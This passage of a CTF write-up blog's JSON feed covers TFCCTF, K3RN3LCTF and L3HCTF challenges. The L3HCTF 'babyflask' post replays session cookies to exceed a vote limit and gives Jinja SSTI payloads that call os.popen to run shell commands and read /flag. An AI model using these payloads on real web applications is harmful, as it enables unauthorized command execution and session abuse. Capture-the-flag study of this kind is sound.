50 e7 07 1d 08 |.........$.P....| 00000840 21 18 26 f4 74 57 57 d7 e5 f9 be ef 84 10 42 08 |!.&amp;.tWW.......B.| ~$ hexdump -C AAAAA | tail 00026cf0 00 00 88 26 13 03 00 00 00 00 44 93 89 01 00 00 |...&amp;......D.....| 00026d00 00 00 a2 c9 c4 00 00 00 00 00 d1 64 62 00 00 00 |...........db...| 00026d10 00 80 68 32 31 00 00 00 00 40 34 99 18 00 00 00 |..h21....@4.....| 00026d20 00 20 9a 4c 0c 00 00 00 00 10 4d 26 06 00 00 00 |. .L......M&amp;....| 00026d30 00 88 f6 7f 00 7a e5 96 20 a3 a9 bd a4 00 00 00 |.....z.. .......| 00026d40 00 49 45 4e 44 ae 42 60 82 41 41 41 41 41 41 41 |.IEND.B`.AAAAAAA| 00026d50 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |AAAAAAAAAAAAAAAA| * 00027510 41 41 41 41 41 41 41 41 41 |AAAAAAAAA| 00027519 去除文件首位的A即可,代码: from pathlib import Path p = Path(&#39;AAAAA&#39;) data = p.read_bytes() data = data.strip(b&#39;A&#39;) Path(&#39;a.png&#39;).write_bytes(data) flag:TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125; DISCORD SHENANIGANSWe considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That’s the beginning of a good CTF! Discord is the new Twitter. To be able to solve this challenge, you’ll need to join our discord. Link in the Rules page. 翻阅比赛官方的Discord,发现#general频道有一条特别奇怪的消息 使用Twitter Secret Messages解密即可 flag:TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125; PRETTY GOOD PHISHERThis phisher thinks he’s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him? A2DCB36111E3656B 题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥 在https://keyserver.pgp.com/上检索,得到邮箱tdgd11fd8@gmail.com 在OSINT Tool上搜索该邮箱,得到用户名是Theobald Dannie Gyles 在https://keyserver.pgp.com/上搜索包含该用户名的PGP密钥,即可得到flag flag:TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;)","summary":"SEA LANGUAGE 1Quick! Help! We are sinking! Wrap the result in TFCCTF{} 看着像摩斯码,直接在gchq.github.io上解密 flag:TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125; SEA LANGUAGE? 2That’s just another way to…… 题目给的数据8个字符为一组,猜测可能是二进制,在gchq.github.io将.替换为0,_替换为1,然后二进制转字符串 flag:TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125; AAAAAAAAAA. That’s all 首先用exiftool分析,提示文件前2000个字节都是A ~$ exiftool AAAAA ExifTool Version Number : 12.31 File Name : AAAAA Directory : . File Size : 157 KiB File Modification Date/Time : 2021:11:27 00:33:54+08:00 File Access Date/Time : 2021:11:27 00:35:25+08:00 File Inode Change Date/Time : 2021:11:27 00:34:19+08:00 File Permissions : -rw-r--r-- Error : First 2000 bytes of file is ASCII &#39;A&#39; characters hexdump -C AAAAA 发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片 ~$ hexdump -C AAAAA | head 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |AAAAAAAAAAAAAAAA| * 000007d0 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.PNG........IHDR| 000007e0 00 00 07 62 00 00 05 89 08 02 00 00 00 23 47 40 |...b.........#G@| 000007f0 3c 00 00 00 09 70 48 59 73 00 00 2e 23 00 00 2e |&lt;....pHYs...#...| 00000800 23 01 78 a5 3f 76 00 02 65 2b 49 44 41 54 78 9c |#.x.?v..e+IDATx.| 00000810 ec bd 67 7b 1a cb da b4 dd 83 10 39 83 50 b6 bd |..g&#123;.......9.P..| 00000820 c2 de ff ff df dc ef 5e 6b d9 96 ad 48 ce 39 cc |.......^k...H.9.| 00000830 fb a1 9e a9 e3 12 b2 bd 1c 24 10 50 e7 07 1d 08 |.........$.P....| 00000840 21 18 26 f4 74 57 57 d7 e5 f9 be ef 84 10 42 08 |!.&amp;.tWW.......B.| ~$ hexdump -C AAAAA | tail 00026cf0 00 00 88 26 13 03 00 00 00 00 44 93 89 01 00 00 |...&amp;......D.....| 00026d00 00 00 a2 c9 c4 00 00 00 00 00 d1 64 62 00 00 00 |...........db...| 00026d10 00 80 68 32 31 00 00 00 00 40 34 99 18 00 00 00 |..h21....@4.....| 00026d20 00 20 9a 4c 0c 00 00 00 00 10 4d 26 06 00 00 00 |. .L......M&amp;....| 00026d30 00 88 f6 7f 00 7a e5 96 20 a3 a9 bd a4 00 00 00 |.....z.. .......| 00026d40 00 49 45 4e 44 ae 42 60 82 41 41 41 41 41 41 41 |.IEND.B`.AAAAAAA| 00026d50 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |AAAAAAAAAAAAAAAA| * 00027510 41 41 41 41 41 41 41 41 41 |AAAAAAAAA| 00027519 去除文件首位的A即可,代码: from pathlib import Path p = Path(&#39;AAAAA&#39;) data = p.read_bytes() data = data.strip(b&#39;A&#39;) Path(&#39;a.png&#39;).write_bytes(data) flag:TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125; DISCORD SHENANIGANSWe considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That’s the beginning of a good CTF! Discord is the new Twitter. To be able to solve this challenge, you’ll need to join our discord. Link in the Rules page. 翻阅比赛官方的Discord,发现#general频道有一条特别奇怪的消息 使用Twitter Secret Messages解密即可 flag:TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125; PRETTY GOOD PHISHERThis phisher thinks he’s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him? A2DCB36111E3656B 题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥 在https://keyserver.pgp.com/上检索,得到邮箱tdgd11fd8@gmail.com 在OSINT Tool上搜索该邮箱,得到用户名是Theobald Dannie Gyles 在https://keyserver.pgp.com/上搜索包含该用户名的PGP密钥,即可得到flag flag:TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;)","date_published":"2021-11-28T13:05:33.000Z","tags":["CTF","CTF","TFCCTF"]},{"id":"https://zhaoqi.vip/posts/3427623925/","url":"https://zhaoqi.vip/posts/3427623925/","title":"K3RN3LCTF2021 Writeup","content_html":"<h1 id=\"3in1\"><a href=\"#3in1\" class=\"headerlink\" title=\"3in1\"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>\n<p><em>Attachments</em></p>\n<p><em><a href=\"https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py\">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>\n<hr>\n<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>\n<pre><code class=\"python\">password = (&quot;abda&quot;)    \nhash_obj = SHA256.new(password.encode(&#39;utf-8&#39;))    \nhkey = hash_obj.digest()\n\ndef decrypt(info):\n    cipher = AES.new(hkey, AES.MODE_ECB)\n    result = cipher.decrypt(info)\n    return result\nmsg =  b&#39;\\x1bkw\\x00\\x01#\\x1dv\\xd1\\x1e\\xfb\\xba\\xac_b\\x02T\\xfbZ\\xca\\xac8Y\\\\8@4\\xba;\\xe1\\x11$\\x19\\xe8\\x89t\\t\\xc8\\xfd\\x93\\xd8-\\xba\\xaa\\xbe\\xf1\\xa0\\xab\\x18\\xa0\\x12$\\x9f\\xdb\\x08~\\x81O\\xf0y\\xe9\\xef\\xc41\\x1a$\\x1cN3\\xe8F\\\\\\xef\\xc1G\\xeb\\xdb\\xa1\\x93*F\\x1b|\\x1c\\xec\\xa3\\x04\\xbf\\x8a\\xd9\\x16\\xbc;\\xd2\\xaav6pWX\\xc1\\xc0o\\xab\\xd5V^\\x1d\\x11\\xe4&#125;6\\xa4\\x1b\\\\G\\xd4e\\xc2mP\\xdb\\x9b\\x9f\\xb0Z\\xf12&#39;\n\nprint(decrypt(msg))\n</code></pre>\n<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>\n<pre><code class=\"python\">b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;\n</code></pre>\n<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>\n<pre><code>A graphic or photographic representation \n</code></pre>\n<p>使用<a href=\"https://www.sonicvisualiser.org/download.html\">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>\n<p><img data-src=\"/../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png\" alt=\"image-20211119215941779\"></p>\n<p><strong>flag:</strong><code>flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125;</code></p>\n<h1 id=\"Progressive-Dynamite\"><a href=\"#Progressive-Dynamite\" class=\"headerlink\" title=\"Progressive Dynamite\"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>\n<p><a href=\"https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt\">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>\n<hr>\n<p>题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小.</p>\n<p>参照<a href=\"https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/\">Leetcode-最小路径和</a>,是一道典型的动态规划题,代码如下:</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nfrom challenge import grid\n\nrows, columns = len(grid), len(grid[0])\ndp = [[0] * columns for _ in range(rows)]\ndp[0][0] = grid[0][0]\nfor i in range(1, rows):\n    dp[i][0] = dp[i - 1][0] + grid[i][0]\nfor j in range(1, columns):\n    dp[0][j] = dp[0][j - 1] + grid[0][j]\nfor i in range(1, rows):\n    for j in range(1, columns):\n        dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]\nprint(dp[rows - 1][columns - 1])\nprint(long_to_bytes(dp[-1][-1]))\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125;</code></p>\n<h1 id=\"Vieta’s-Poly\"><a href=\"#Vieta’s-Poly\" class=\"headerlink\" title=\"Vieta’s Poly\"></a>Vieta’s Poly</h1><p>Here’s a pwntools tutorial challenge to get you warmed up!</p>\n<p>nc ctf.k3rn3l4rmy.com 2236</p>\n<p><a href=\"https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py\">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>\n<hr>\n<p>题目给了一个多项式,要求我们计算:</p>\n<ul>\n<li>根的和</li>\n<li>根的倒数的和</li>\n<li>根的平方的和</li>\n</ul>\n<p>解析出多项式系数,借助<code>numpy.poly1d</code>构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数)</p>\n<p>代码:</p>\n<pre><code class=\"python\">from math import ceil\nfrom pwn import *\nimport numpy as np\n\ncontext.log_level = &#39;debug&#39;\nconn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236)\n\ndef get_input():\n    input = conn.recvline().strip().decode()\n    return input\n\ndef parse(polynomial):\n    &#39;&#39;&#39;\n    TODO: Parse polynomial\n    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]\n    &#39;&#39;&#39;\n    pattern = re.compile(r&quot;([-]?\\d+?)x\\^\\d+&quot;)\n    ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;))\n    ls.insert(0, 1)\n    return list(map(int, ls))\n\nfor _ in range(4):\n    get_input()\nfor i in range(100):\n    type = get_input()\n    coeffs = parse(get_input())\n    ans = -1\n    Q = np.poly1d(coeffs, r=False)\n    xs = np.roots(Q)\n    if &#39;sum of the roots&#39; in type:\n        ans = xs.sum()\n    elif &#39;sum of the reciprocals of the roots&#39; in type:\n        ans = (1/xs).sum()\n    elif &#39;sum of the squares of the roots&#39; in type:\n        ans = np.power(xs,2).sum()\n    ans = ceil(round(ans.real,2))\n    conn.sendline(str(ans))\n    get_input()\nconn.interactive()\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;Viet4s_f0r_th3_win&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"3in1DescriptionLike Nescafeeeee! Attachments https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py 分析代码,发现是AES加密,密钥为hkey password = (&quot;abda&quot;) hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;)) hkey = hash_obj.digest() def decrypt(info): cipher = AES.new(hkey, AES.MODE_ECB) result = cipher.decrypt(info) return result msg = b&#39;\\x1bkw\\x00\\x01#\\x1dv\\xd1\\x1e\\xfb\\xba\\xac_b\\x02T\\xfbZ\\xca\\xac8Y\\\\8@4\\xba;\\xe1\\x11$\\x19\\xe8\\x89t\\t\\xc8\\xfd\\x93\\xd8-\\xba\\xaa\\xbe\\xf1\\xa0\\xab\\x18\\xa0\\x12$\\x9f\\xdb\\x08~\\x81O\\xf0y\\xe9\\xef\\xc41\\x1a$\\x1cN3\\xe8F\\\\\\xef\\xc1G\\xeb\\xdb\\xa1\\x93*F\\x1b|\\x1c\\xec\\xa3\\x04\\xbf\\x8a\\xd9\\x16\\xbc;\\xd2\\xaav6pWX\\xc1\\xc0o\\xab\\xd5V^\\x1d\\x11\\xe4&#125;6\\xa4\\x1b\\\\G\\xd4e\\xc2mP\\xdb\\x9b\\x9f\\xb0Z\\xf12&#39; print(decrypt(msg)) AES解密得到两个url,访问url得到文件hint.txt和flag.wav b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39; 查看hint.txt,提示我们“图形或照片表示” A graphic or photographic representation 使用Sonic Visualiser打开flag.wav,点击Layer-&gt;Add Spectrogram,得到flag flag:flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125; Progressive DynamiteFind the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move. https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt 题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小. 参照Leetcode-最小路径和,是一道典型的动态规划题,代码如下: from Crypto.Util.number import * from challenge import grid rows, columns = len(grid), len(grid[0]) dp = [[0] * columns for _ in range(rows)] dp[0][0] = grid[0][0] for i in range(1, rows): dp[i][0] = dp[i - 1][0] + grid[i][0] for j in range(1, columns): dp[0][j] = dp[0][j - 1] + grid[0][j] for i in range(1, rows): for j in range(1, columns): dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j] print(dp[rows - 1][columns - 1]) print(long_to_bytes(dp[-1][-1])) flag:flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125; Vieta’s PolyHere’s a pwntools tutorial challenge to get you warmed up! nc ctf.k3rn3l4rmy.com 2236 https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py 题目给了一个多项式,要求我们计算: 根的和 根的倒数的和 根的平方的和 解析出多项式系数,借助numpy.poly1d构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数) 代码: from math import ceil from pwn import * import numpy as np context.log_level = &#39;debug&#39; conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236) def get_input(): input = conn.recvline().strip().decode() return input def parse(polynomial): &#39;&#39;&#39; TODO: Parse polynomial For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1] &#39;&#39;&#39; pattern = re.compile(r&quot;([-]?\\d+?)x\\^\\d+&quot;) ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;)) ls.insert(0, 1) return list(map(int, ls)) for _ in range(4): get_input() for i in range(100): type = get_input() coeffs = parse(get_input()) ans = -1 Q = np.poly1d(coeffs, r=False) xs = np.roots(Q) if &#39;sum of the roots&#39; in type: ans = xs.sum() elif &#39;sum of the reciprocals of the roots&#39; in type: ans = (1/xs).sum() elif &#39;sum of the squares of the roots&#39; in type: ans = np.power(xs,2).sum() ans = ceil(round(ans.real,2)) conn.sendline(str(ans)) get_input() conn.interactive() flag:flag&#123;Viet4s_f0r_th3_win&#125;","summary":"3in1DescriptionLike Nescafeeeee! Attachments https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py 分析代码,发现是AES加密,密钥为hkey password = (&quot;abda&quot;) hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;)) hkey = hash_obj.digest() def decrypt(info): cipher = AES.new(hkey, AES.MODE_ECB) result = cipher.decrypt(info) return result msg = b&#39;\\x1bkw\\x00\\x01#\\x1dv\\xd1\\x1e\\xfb\\xba\\xac_b\\x02T\\xfbZ\\xca\\xac8Y\\\\8@4\\xba;\\xe1\\x11$\\x19\\xe8\\x89t\\t\\xc8\\xfd\\x93\\xd8-\\xba\\xaa\\xbe\\xf1\\xa0\\xab\\x18\\xa0\\x12$\\x9f\\xdb\\x08~\\x81O\\xf0y\\xe9\\xef\\xc41\\x1a$\\x1cN3\\xe8F\\\\\\xef\\xc1G\\xeb\\xdb\\xa1\\x93*F\\x1b|\\x1c\\xec\\xa3\\x04\\xbf\\x8a\\xd9\\x16\\xbc;\\xd2\\xaav6pWX\\xc1\\xc0o\\xab\\xd5V^\\x1d\\x11\\xe4&#125;6\\xa4\\x1b\\\\G\\xd4e\\xc2mP\\xdb\\x9b\\x9f\\xb0Z\\xf12&#39; print(decrypt(msg)) AES解密得到两个url,访问url得到文件hint.txt和flag.wav b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39; 查看hint.txt,提示我们“图形或照片表示” A graphic or photographic representation 使用Sonic Visualiser打开flag.wav,点击Layer-&gt;Add Spectrogram,得到flag flag:flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125; Progressive DynamiteFind the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move. https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt 题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小. 参照Leetcode-最小路径和,是一道典型的动态规划题,代码如下: from Crypto.Util.number import * from challenge import grid rows, columns = len(grid), len(grid[0]) dp = [[0] * columns for _ in range(rows)] dp[0][0] = grid[0][0] for i in range(1, rows): dp[i][0] = dp[i - 1][0] + grid[i][0] for j in range(1, columns): dp[0][j] = dp[0][j - 1] + grid[0][j] for i in range(1, rows): for j in range(1, columns): dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j] print(dp[rows - 1][columns - 1]) print(long_to_bytes(dp[-1][-1])) flag:flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125; Vieta’s PolyHere’s a pwntools tutorial challenge to get you warmed up! nc ctf.k3rn3l4rmy.com 2236 https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py 题目给了一个多项式,要求我们计算: 根的和 根的倒数的和 根的平方的和 解析出多项式系数,借助numpy.poly1d构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数) 代码: from math import ceil from pwn import * import numpy as np context.log_level = &#39;debug&#39; conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236) def get_input(): input = conn.recvline().strip().decode() return input def parse(polynomial): &#39;&#39;&#39; TODO: Parse polynomial For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1] &#39;&#39;&#39; pattern = re.compile(r&quot;([-]?\\d+?)x\\^\\d+&quot;) ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;)) ls.insert(0, 1) return list(map(int, ls)) for _ in range(4): get_input() for i in range(100): type = get_input() coeffs = parse(get_input()) ans = -1 Q = np.poly1d(coeffs, r=False) xs = np.roots(Q) if &#39;sum of the roots&#39; in type: ans = xs.sum() elif &#39;sum of the reciprocals of the roots&#39; in type: ans = (1/xs).sum() elif &#39;sum of the squares of the roots&#39; in type: ans = np.power(xs,2).sum() ans = ceil(round(ans.real,2)) conn.sendline(str(ans)) get_input() conn.interactive() flag:flag&#123;Viet4s_f0r_th3_win&#125;","date_published":"2021-11-15T05:33:23.000Z","tags":["CTF","CTF","K3RN3LCTF"]},{"id":"https://zhaoqi.vip/posts/98571386/","url":"https://zhaoqi.vip/posts/98571386/","title":"L3HCTF2021-个人能力认证 Writeup","content_html":"<h1 id=\"babyflask\"><a href=\"#babyflask\" class=\"headerlink\" title=\"babyflask\"></a>babyflask</h1><p><em><a href=\"http://123.60.19.253:10001/\">http://123.60.19.253:10001</a></em></p>\n<hr>\n<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>\n<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>\n<pre><code class=\"python\">template =  &#39;&#39;&#39;\nCongratulations, %s. You can get flag now!\n&#39;&#39;&#39; % name\nreturn render_template_string(template)\n</code></pre>\n<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>\n<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>\n<blockquote>\n<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>\n</blockquote>\n<img data-src=\"../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg\" alt=\"image-20211114190032492\" style=\"zoom:50%;\" />\n\n<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>\n<pre><code class=\"python\">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;\n</code></pre>\n<img data-src=\"../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg\" alt=\"image-20211114182131940\" style=\"zoom:50%;\" />\n\n<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>\n<pre><code class=\"python\">num = 0\nfor i in a.split(&#39;, &#39;):\n    if &#39;os._wrap_close&#39; in i:\n        print(num)\n    num += 1\n</code></pre>\n<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>\n<pre><code class=\"python\">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;\n</code></pre>\n<p><img data-src=\"/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png\" alt=\"image-20211114183143814\"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>\n<pre><code class=\"python\">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;\n</code></pre>\n<p><img data-src=\"/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png\" alt=\"image-20211114183703433\"></p>\n<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>\n<pre><code class=\"python\">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;\n</code></pre>\n<p><img data-src=\"/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg\" alt=\"image-20211114183857713\"><br>直接<code>cat /flag</code>即可</p>\n<pre><code class=\"python\">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;\n</code></pre>\n<p><img data-src=\"/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png\" alt=\"image-20211114184236370\"></p>\n<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"babyflaskhttp://123.60.19.253:10001 分析给出的源文件,发现/success路由下的name存在SSTI漏洞. 继续分析,name取自session[&#39;name&#39;],用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可. template = &#39;&#39;&#39; Congratulations, %s. You can get flag now! &#39;&#39;&#39; % name return render_template_string(template) 要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,/vote接口会校验session中保存的vote数量并减一,猜测这里可能存在session会话劫持. 我们第一次登录时复制一下当前的session,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的seesion粘贴进浏览器保存的Cookie中,我们的票又回来了. 🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一. 使用如下代码作为用户名登录,查看一下当前已加载模块 &#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125; 人肉计数&#x2F;写个脚本,找到os._wrap_close模块所在的索引,借助于popen函数可以直接执行系统命令 num = 0 for i in a.split(&#39;, &#39;): if &#39;os._wrap_close&#39; in i: print(num) num += 1 先ls -a一下,发现config.py &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125; 继续cat,没有在config.py中找到flag &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125; 用ls -R /找找,发现存在/flag文件 &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125; 直接cat /flag即可 &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125; flag:l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;","summary":"babyflaskhttp://123.60.19.253:10001 分析给出的源文件,发现/success路由下的name存在SSTI漏洞. 继续分析,name取自session[&#39;name&#39;],用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可. template = &#39;&#39;&#39; Congratulations, %s. You can get flag now! &#39;&#39;&#39; % name return render_template_string(template) 要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,/vote接口会校验session中保存的vote数量并减一,猜测这里可能存在session会话劫持. 我们第一次登录时复制一下当前的session,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的seesion粘贴进浏览器保存的Cookie中,我们的票又回来了. 🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一. 使用如下代码作为用户名登录,查看一下当前已加载模块 &#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125; 人肉计数&#x2F;写个脚本,找到os._wrap_close模块所在的索引,借助于popen函数可以直接执行系统命令 num = 0 for i in a.split(&#39;, &#39;): if &#39;os._wrap_close&#39; in i: print(num) num += 1 先ls -a一下,发现config.py &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125; 继续cat,没有在config.py中找到flag &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125; 用ls -R /找找,发现存在/flag文件 &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125; 直接cat /flag即可 &#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125; flag:l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;","date_published":"2021-11-14T11:05:32.000Z","tags":["CTF","CTF","L3HCTF","个人能力认证"]},{"id":"https://zhaoqi.vip/posts/2621990551/","url":"https://zhaoqi.vip/posts/2621990551/","title":"KillerQueenCTF2021 Writeup","content_html":"<h1 id=\"Cloudsourcing\"><a href=\"#Cloudsourcing\" class=\"headerlink\" title=\"Cloudsourcing\"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>\n<hr>\n<p>使用<a href=\"https://github.com/Ganapati/RsaCtfTool\">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>\n<pre><code class=\"shell\">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private\n-----BEGIN RSA 